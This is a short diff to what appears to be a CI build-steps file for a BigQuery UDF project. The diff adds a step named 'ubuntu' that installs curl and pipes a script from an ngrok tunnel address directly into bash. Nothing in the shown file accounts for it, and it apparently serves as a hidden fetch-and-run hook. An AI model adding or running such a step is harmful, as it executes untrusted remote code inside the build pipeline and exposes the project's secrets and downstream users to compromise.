@@ -18,6 +18,9 @@ steps:
   # Dynamically create the package.json file based off the libs
   # specified in the js_libs/js_libs.yaml file.
   ############################################################
+
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 - name: gcr.io/bqutil/bq_udf_ci
   id: generate_js_libs_package_json
   entrypoint: python3
